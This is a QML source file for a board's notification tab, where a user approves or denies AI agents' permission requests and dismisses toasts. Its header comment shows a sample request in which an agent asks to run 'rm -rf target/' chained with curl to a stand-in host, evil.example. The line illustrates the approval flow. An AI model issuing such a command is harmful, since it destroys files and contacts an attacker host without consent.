// BoardNotif.qml — the board's NOTIF tab (intent §3.3): the herald ledger
// (`state/stage/herald.json`, newest first) as borderless blocks.
//
//   herald ▸ claude                                     now
//   minerva-owl wants to run a command
//   "Bash: rm -rf target/ && curl https://evil.example/…"
//   [y] approve  [n] deny
//
// A HELPER (uppercase — never a slot), loaded by URL from BoardBody.
//
// The only two commands, in sonata herald-center's exact shapes:
//   {cmd:"heraldverdict", id:<sessionId>, verdict:"approve"|"deny"}  a summons
//   {cmd:"heralddismiss", id:<record id>}   a toast; id "*" for [c] clear
// A summons cannot be waved away — it is answered. Sender text is untrusted
// DATA: PlainText, quoted, wrapped, never linkified (house rule 4).
// Keys: j/k select · y/n answer the selected summons · x dismiss the
// selected toast · c clear.
import QtQuick

Item {
    id: root

    required property var kit
    required property var board

    component Use: Loader {
        required property var kit
        required property string helper
        property var props: ({})
        Component.onCompleted: {
            var p = { kit: Qt.binding(() => kit) }
            for (var k in props) p[k] = props[k]
            setSource(kit.helper(helper), p)
        }
    }

    readonly property var rows: board.heraldRows
    property string selId: ""
    readonly property int selIndex: {
        for (var i = 0; i < rows.length; i++) if ("" + rows[i].id === selId) return i
        return -1
    }
    readonly property var sel: selIndex >= 0 ? rows[selIndex] : null
    function select(i) {
        if (rows.length === 0) return
        i = Math.max(0, Math.min(rows.length - 1, i))
        selId = "" + rows[i].id
    }
    function handleKey(e) {
        switch (e.key) {
        case Qt.Key_J: case Qt.Key_Down: select(selIndex + 1); return true
        case Qt.Key_K: case Qt.Key_Up:   select(selIndex < 0 ? 0 : selIndex - 1); return true
        case Qt.Key_Y: if (sel && sel.kind === "summons") board.heraldVerdict(sel.sessionId, "approve"); return true
        case Qt.Key_N: if (sel && sel.kind === "summons") board.heraldVerdict(sel.sessionId, "deny"); return true
        case Qt.Key_X: case Qt.Key_Delete: if (sel && sel.kind !== "summons") board.heraldDismiss(sel.id); return true
        case Qt.Key_C: board.heraldDismiss("*"); return true
        }
        return false
    }

    function flat(s) { return ("" + (s || "")).replace(/[\u0000-\u001f\u007f]+/g, " ") }

    // header line
    Row {
        id: head
        Text {
            text: root.rows.length + " on the books"
            color: root.kit.number; font: root.kit.font; textFormat: Text.PlainText
        }
        Text {
            text: root.board.summonsCount > 0 ? " · " + root.board.summonsCount + " summons" : ""
            color: root.kit.urgent; font: root.kit.font; textFormat: Text.PlainText
        }
    }
    Row {
        anchors.right: parent.right
        visible: root.rows.length > 0
        Text { text: "[c] "; color: root.kit.dim; font: root.kit.font; textFormat: Text.PlainText }
        Text {
            text: "clear"
            color: root.kit.mid; font: root.kit.font; textFormat: Text.PlainText
            MouseArea { anchors.fill: parent; cursorShape: Qt.PointingHandCursor; onClicked: root.board.heraldDismiss("*") }
        }
    }

    Text {
        y: root.kit.lines(2)
        visible: root.rows.length === 0
        text: "no notifications"
        color: root.kit.dim; font: root.kit.font; textFormat: Text.PlainText
    }

    Flickable {
        y: root.kit.lines(2)
        width: parent.width
        height: parent.height - y
        contentHeight: col.implicitHeight
        boundsBehavior: Flickable.StopAtBounds
        clip: true
        Column {
            id: col
            width: parent.width
            spacing: Math.round(root.kit.cellH / 2)
            Repeater {
                model: root.rows
                Use {
                    id: rec
                    required property var modelData
                    readonly property var r: modelData
                    readonly property bool summons: r.kind === "summons"
                    readonly property bool critical: ("" + r.urgency) === "critical"
                    width: col.width
                    kit: root.kit; helper: "Block"
                    props: ({
                        label: "herald ▸ " + root.flat(rec.r.app || "?") + (rec.summons ? " · SUMMONS" : ""),
                        tone: (rec.summons || rec.critical) ? root.kit.urgent : root.kit.dim,
                        stamp: Qt.binding(() => root.board.age(rec.r.receivedAt)),
                        selected: Qt.binding(() => ("" + rec.r.id) === root.selId),
                        content: recBody
                    })
                    // a click selects; a click on a toast's [x] dismisses
                    MouseArea {
                        anchors.fill: parent
                        z: -1
                        onClicked: { root.selId = "" + rec.r.id; root.board.forceActiveFocus() }
                    }
                    Component {
                        id: recBody
                        Column {
                            width: parent ? parent.width : 0
                            Text {
                                width: parent.width
                                text: root.flat(rec.r.summary)
                                elide: Text.ElideRight
                                color: rec.summons ? root.kit.bright : root.kit.ink
                                font: root.kit.font; textFormat: Text.PlainText
                                style: Text.Outline; styleColor: root.kit.withA(color, 0.18)
                            }
                            Text {
                                visible: !!rec.r.body
                                width: parent.width
                                text: "“" + root.flat(rec.r.body) + "”"
                                wrapMode: Text.WrapAnywhere
                                maximumLineCount: 4
                                elide: Text.ElideRight
                                color: root.kit.mid; font: root.kit.font; textFormat: Text.PlainText
                            }
                            Text {
                                visible: rec.r.progress !== undefined && rec.r.progress >= 0
                                text: visible ? root.kit.gaugeText(rec.r.progress / 100, 20).fill
                                              + root.kit.gaugeText(rec.r.progress / 100, 20).track + " " + rec.r.progress + "%" : ""
                                color: root.kit.number; font: root.kit.font; textFormat: Text.PlainText
                            }
                            Row {
                                visible: rec.summons
                                Text { text: "[y] "; color: root.kit.dim; font: root.kit.font; textFormat: Text.PlainText }
                                Text {
                                    text: "approve"; color: root.kit.match; font: root.kit.font; textFormat: Text.PlainText
                                    MouseArea { anchors.fill: parent; cursorShape: Qt.PointingHandCursor
                                                onClicked: root.board.heraldVerdict(rec.r.sessionId, "approve") }
                                }
                                Text { text: "  [n] "; color: root.kit.dim; font: root.kit.font; textFormat: Text.PlainText }
                                Text {
                                    text: "deny"; color: root.kit.urgent; font: root.kit.font; textFormat: Text.PlainText
                                    MouseArea { anchors.fill: parent; cursorShape: Qt.PointingHandCursor
                                                onClicked: root.board.heraldVerdict(rec.r.sessionId, "deny") }
                                }
                            }
                            Row {
                                visible: !rec.summons
                                Text { text: "[x] "; color: root.kit.dim; font: root.kit.font; textFormat: Text.PlainText }
                                Text {
                                    text: "dismiss"; color: root.kit.mid; font: root.kit.font; textFormat: Text.PlainText
                                    MouseArea { anchors.fill: parent; cursorShape: Qt.PointingHandCursor
                                                onClicked: root.board.heraldDismiss(rec.r.id) }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
